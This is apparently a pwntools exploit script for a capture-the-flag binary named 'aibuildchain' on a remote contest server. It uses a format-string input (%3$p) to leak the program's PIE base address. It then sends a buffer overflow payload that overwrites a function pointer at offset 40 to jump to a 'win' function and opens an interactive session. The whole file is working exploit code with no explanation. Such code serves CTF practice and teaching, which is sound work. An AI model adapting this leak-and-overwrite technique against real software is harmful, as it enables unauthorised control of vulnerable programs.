#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './aibuildchain'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
host, port = 'aibuildchain.winja.org', 53782 

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()

    # leaking piebase
    io.sendlineafter(b'choice:', b'1')
    io.sendlineafter(b'prompt:', b'%3$p')
    
    # leaked piebase
    io.sendlineafter(b'choice:', b'2')
    io.recvuntil(b'Output:')
    leak = int(io.recvline().strip(), 16)
    elf.address = leak - 0x128e
    
    # overwriting function pointer
    payload = flat({40: elf.address + 0x12e5})
    io.sendlineafter(b'choice:', b'1')
    io.sendlineafter(b'prompt:', payload)
    
    # calling win
    io.sendlineafter(b'choice:', b'1')

    info("elf base: %#x", elf.address)
    io.interactive()
    
if __name__ == '__main__':
    exploit()